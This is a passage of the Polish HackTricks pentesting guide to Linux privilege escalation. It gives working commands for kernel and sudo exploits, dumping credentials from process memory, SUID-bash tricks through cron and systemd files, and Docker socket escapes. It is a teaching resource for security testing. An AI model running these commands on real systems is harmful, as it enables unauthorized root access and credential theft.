# Linux Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zdobycia wiedzy o działającym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Jeśli **masz uprawnienia do zapisu w jakimkolwiek folderze wewnątrz zmiennej `PATH`**, możesz być w stanie przejąć niektóre biblioteki lub binaria:
```bash
echo $PATH
```
### Env info

Interesujące informacje, hasła lub klucze API w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Sprawdź wersję jądra i czy istnieje jakiś exploit, który można wykorzystać do eskalacji uprawnień.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i kilka już **skompilowanych exploitów** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Inne strony, na których możesz znaleźć kilka **skompilowanych exploitów**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony, możesz zrobić:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu exploitów jądra to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (wykonaj W ofierze, sprawdza tylko exploity dla jądra 2.x)

Zawsze **wyszukuj wersję jądra w Google**, może się okazać, że Twoja wersja jądra jest wymieniona w jakimś exploicie jądra, a wtedy będziesz pewien, że ten exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które pojawiają się w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB** dla **przykładu** jak ta luka może być wykorzystana
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej enumeracji systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Jeśli jesteś wewnątrz kontenera docker, możesz spróbować z niego uciec:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić prywatne informacje.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne binaria
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **jakikolwiek kompilator jest zainstalowany**. Jest to przydatne, jeśli musisz użyć jakiegoś exploit'a jądra, ponieważ zaleca się skompilowanie go na maszynie, na której zamierzasz go używać (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane oprogramowanie z lukami

Sprawdź **wersję zainstalowanych pakietów i usług**. Może istnieje jakaś stara wersja Nagios (na przykład), która mogłaby być wykorzystana do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić, czy na maszynie zainstalowane są przestarzałe i podatne na ataki oprogramowanie.

{% hint style="info" %}
_Uwaga, że te polecenia pokażą wiele informacji, które będą głównie bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy któraś z zainstalowanych wersji oprogramowania jest podatna na znane exploity._
{% endhint %}

## Procesy

Sprawdź **jakie procesy** są uruchamiane i sprawdź, czy którykolwiek proces ma **więcej uprawnień niż powinien** (może tomcat uruchamiany przez roota?)
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj możliwe [**debuggery electron/cef/chromium** działające, możesz je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywają je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Również **sprawdź swoje uprawnienia do binariów procesów**, może uda ci się nadpisać kogoś.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikacji podatnych procesów, które są często uruchamiane lub gdy spełniony jest zestaw wymagań.

### Pamięć procesu

Niektóre usługi serwera zapisują **poświadczenia w postaci czystego tekstu w pamięci**.\
Zazwyczaj będziesz potrzebować **uprawnień roota**, aby odczytać pamięć procesów, które należą do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy już jesteś rootem i chcesz odkryć więcej poświadczeń.\
Jednak pamiętaj, że **jako zwykły użytkownik możesz odczytać pamięć procesów, które posiadasz**.

{% hint style="warning" %}
Zauważ, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać innych procesów, które należą do twojego nieuprzywilejowanego użytkownika.

Plik _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroluje dostępność ptrace:

* **kernel.yama.ptrace\_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To klasyczny sposób, w jaki działało ptracing.
* **kernel.yama.ptrace\_scope = 1**: tylko proces nadrzędny może być debugowany.
* **kernel.yama.ptrace\_scope = 2**: Tylko administrator może używać ptrace, ponieważ wymaga to uprawnienia CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu, wymagany jest restart, aby ponownie włączyć ptracing.
{% endhint %}

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać stertę i przeszukać jej poświadczenia.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu, **maps pokazuje, jak pamięć jest mapowana w wirtualnej przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdej mapowanej sekcji**. Pseudo plik **mem** **ujawnia pamięć procesów**. Z pliku **maps** wiemy, które **regiony pamięci są czytelne** i ich przesunięcia. Używamy tych informacji, aby **przeszukiwać plik mem i zrzucać wszystkie czytelne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Wirtualna przestrzeń adresowa jądra może być dostępna za pomocą /dev/kmem.\
Typowo, `/dev/mem` jest tylko do odczytu przez **root** i grupę **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla linux

ProcDump to linuksowa reinterpretacja klasycznego narzędzia ProcDump z zestawu narzędzi Sysinternals dla systemu Windows. Pobierz je w [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące roota i zrzucić proces, który należy do Ciebie
* Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany jest root)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz, że proces uwierzytelniający jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić proces (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby na zrzucenie pamięci procesu) i przeszukać pamięć w poszukiwaniu poświadczeń:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **kradnie hasła w postaci czystego tekstu z pamięci** oraz z niektórych **znanych plików**. Wymaga uprawnień roota, aby działać poprawnie.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (Aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (Aktywne sesje SSH - użycie Sudo)         | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/zadania Cron

Sprawdź, czy jakiekolwiek zaplanowane zadanie jest podatne. Może uda ci się skorzystać ze skryptu wykonywanego przez roota (vuln z użyciem symboli wieloznacznych? można modyfikować pliki używane przez roota? użyj symlinków? utwórz konkretne pliki w katalogu, który używa root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na przykład, w _/etc/crontab_ możesz znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontabie użytkownik root spróbuje wykonać jakieś polecenie lub skrypt bez ustawienia ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać powłokę roota, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron używający skryptu z symbolem wieloznacznym (Wildcard Injection)

Jeśli skrypt wykonywany przez roota zawiera „**\***” w poleceniu, możesz to wykorzystać do wywołania nieoczekiwanych rzeczy (jak privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli znak wieloznaczny jest poprzedzony ścieżką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej sztuczek z wykorzystaniem znaków wieloznacznych:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Nadpisywanie skryptu cron i symlink

Jeśli **możesz modyfikować skrypt cron** wykonywany przez roota, możesz bardzo łatwo uzyskać powłokę:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt wykonywany przez root używa **katalogu, do którego masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie folderu symlink do innego**, który obsługuje skrypt kontrolowany przez Ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste zadania cron

Możesz monitorować procesy, aby wyszukiwać procesy, które są wykonywane co 1, 2 lub 5 minut. Może uda ci się to wykorzystać i podnieść uprawnienia.

Na przykład, aby **monitorować co 0,1s przez 1 minutę**, **posortować według mniej wykonywanych poleceń** i usunąć polecenia, które były wykonywane najczęściej, możesz zrobić:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to będzie monitorować i wyświetlać każdy proces, który się uruchamia).

### Niewidoczne zadania cron

Możliwe jest stworzenie zadania cron **dodając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zauważ znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Zapisane pliki _.service_

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`, jeśli tak, **możesz go zmodyfikować**, aby **wykonywał** twoją **tylną furtkę, gdy** usługa jest **uruchamiana**, **ponownie uruchamiana** lub **zatrzymywana** (może będziesz musiał poczekać, aż maszyna zostanie ponownie uruchomiona).\
Na przykład stwórz swoją tylną furtkę wewnątrz pliku .service z **`ExecStart=/tmp/script.sh`**

### Zapisane binaria usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu w binariach wykonywanych przez usługi**, możesz je zmienić na tylne furtki, aby gdy usługi zostaną ponownie uruchomione, tylne furtki będą wykonywane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć PATH używaną przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w dowolnym z folderów ścieżki, możesz być w stanie **eskalować uprawnienia**. Musisz poszukać **ścieżek względnych używanych w plikach konfiguracji usług** takich jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie utwórz **wykonywalny** plik o **tej samej nazwie co binarny plik w ścieżce względnej** wewnątrz folderu PATH systemd, do którego masz prawo zapisu, a gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), twoja **tylnia furtka zostanie wykonana** (użytkownicy bez uprawnień zazwyczaj nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki `**.service**` lub zdarzenia. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasowych kalendarza i zdarzeń monotonicznych oraz mogą być uruchamiane asynchronicznie.

Możesz wylistować wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Writable timers

Jeśli możesz modyfikować timer, możesz sprawić, że wykona on niektóre instancje systemd.unit (takie jak `.service` lub `.target`)
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest jednostka:

> Jednostka do aktywacji, gdy ten timer wygaśnie. Argument to nazwa jednostki, której przyrostek nie jest ".timer". Jeśli nie jest określona, ta wartość domyślnie odnosi się do usługi, która ma tę samą nazwę co jednostka timera, z wyjątkiem przyrostka. (Zobacz powyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, i nazwa jednostki timera były identyczne, z wyjątkiem przyrostka.

Dlatego, aby nadużyć tego uprawnienia, musisz:

* Znaleźć jakąś jednostkę systemd (taką jak `.service`), która **wykonuje zapisywalny plik binarny**
* Znaleźć jakąś jednostkę systemd, która **wykonuje względną ścieżkę** i masz **uprawnienia do zapisu** w **ścieżce systemd** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i wykonać:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) umożliwiają **komunikację procesów** na tych samych lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Te opcje są różne, ale podsumowanie jest używane do **określenia, gdzie będzie nasłuchiwać** na gniazdo (ścieżka pliku gniazda AF_UNIX, IPv4/6 i/lub numer portu do nasłuchu itp.)
* `Accept`: Przyjmuje argument boolean. Jeśli **true**, **instancja usługi jest uruchamiana dla każdego przychodzącego połączenia** i tylko gniazdo połączenia jest do niej przekazywane. Jeśli **false**, wszystkie gniazda nasłuchujące są **przekazywane do uruchomionej jednostki usługi**, a tylko jedna jednostka usługi jest uruchamiana dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie jedna jednostka usługi bezwarunkowo obsługuje cały ruch przychodzący. **Domyślnie false**. Z powodów wydajnościowych zaleca się pisanie nowych demonów w sposób odpowiedni dla `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Przyjmuje jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** tym, jak nasłuchujące **gniazda**/FIFO są **tworzone** i związane, odpowiednio. Pierwszy token linii poleceń musi być absolutną nazwą pliku, a następnie muszą być podane argumenty dla procesu.
* `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** tym, jak nasłuchujące **gniazda**/FIFO są **zamykane** i usuwane, odpowiednio.
* `Service`: Określa nazwę jednostki **usługi**, **którą należy aktywować** w przypadku **przychodzącego ruchu**. Ustawienie to jest dozwolone tylko dla gniazd z Accept=no. Domyślnie jest to usługa, która nosi tę samą nazwę co gniazdo (z zastąpionym sufiksem). W większości przypadków nie powinno być konieczne korzystanie z tej opcji.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Surowe połączenie
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Przykład eksploatacji:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Gniazda HTTP

Zauważ, że mogą istnieć **gniazda nasłuchujące na żądania HTTP** (_Nie mówię o plikach .socket, ale o plikach działających jako gniazda unixowe_). Możesz to sprawdzić za pomocą:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Jeśli gniazdo **odpowiada żądaniem HTTP**, możesz **komunikować się** z nim i być może **wykorzystać jakąś lukę**.

### Zapisowalny gniazdo Docker

Gniazdo Docker, często znajdujące się w `/var/run/docker.sock`, jest krytycznym plikiem, który powinien być zabezpieczony. Domyślnie jest zapisywalne przez użytkownika `root` i członków grupy `docker`. Posiadanie dostępu do zapisu w tym gnieździe może prowadzić do eskalacji uprawnień. Oto podział, jak można to zrobić oraz alternatywne metody, jeśli interfejs wiersza poleceń Docker nie jest dostępny.

#### **Eskalacja uprawnień z użyciem Docker CLI**

Jeśli masz dostęp do zapisu w gnieździe Docker, możesz eskalować uprawnienia, używając następujących poleceń:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Te polecenia pozwalają na uruchomienie kontenera z dostępem na poziomie roota do systemu plików hosta.

#### **Bezpośrednie użycie API Dockera**

W przypadkach, gdy interfejs wiersza poleceń Dockera nie jest dostępny, gniazdo Dockera można nadal manipulować za pomocą API Dockera i poleceń `curl`.

1.  **Lista obrazów Dockera:** Pobierz listę dostępnych obrazów.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Utwórz kontener:** Wyślij żądanie utworzenia kontenera, który montuje katalog główny systemu hosta.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Uruchom nowo utworzony kontener:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Podłącz do kontenera:** Użyj `socat`, aby nawiązać połączenie z kontenerem, umożliwiając wykonanie poleceń w jego wnętrzu.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Po skonfigurowaniu połączenia `socat` możesz wykonywać polecenia bezpośrednio w kontenerze z dostępem na poziomie roota do systemu plików hosta.

### Inne

Zauważ, że jeśli masz uprawnienia do zapisu w gnieździe dockera, ponieważ jesteś **w grupie `docker`**, masz [**więcej sposobów na eskalację uprawnień**](interesting-groups-linux-pe/#docker-group). Jeśli [**API dockera nasłuchuje na porcie**, możesz również być w stanie je skompromitować](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na wydostanie się z dockera lub nadużycie go w celu eskalacji uprawnień** w:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Eskalacja uprawnień Containerd (ctr)

Jeśli odkryjesz, że możesz używać polecenia **`ctr`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Eskalacja uprawnień **RunC**

Jeśli odkryjesz, że możesz używać polecenia **`runc`**, przeczytaj następującą stronę, ponieważ **możesz być w stanie nadużyć go w celu eskalacji uprawnień**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom efektywne interakcje i dzielenie się danymi. Zaprojektowany z myślą o nowoczesnym systemie Linux, oferuje solidną strukturę dla różnych form komunikacji aplikacji.

System jest wszechstronny, wspierając podstawowe IPC, które poprawia wymianę danych między procesami, przypominając **ulepszone gniazda domeny UNIX**. Ponadto, wspomaga w nadawaniu zdarzeń lub sygnałów, sprzyjając płynnej integracji między komponentami systemu. Na przykład, sygnał od demona Bluetooth o nadchodzącym połączeniu może spowodować, że odtwarzacz muzyki wyciszy dźwięk, poprawiając doświadczenia użytkownika. Dodatkowo, D-Bus wspiera system obiektów zdalnych, upraszczając żądania usług i wywołania metod między aplikacjami, usprawniając procesy, które były tradycyjnie złożone.

D-Bus działa na modelu **zezwolenia/odmowy**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie kumulatywnego efektu dopasowanych reguł polityki. Polityki te określają interakcje z magistralą, potencjalnie umożliwiając eskalację uprawnień poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` jest podany, szczegółowo opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości z `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalne, podczas gdy polityki kontekstu "domyślnego" mają zastosowanie do wszystkich, które nie są objęte innymi specyficznymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
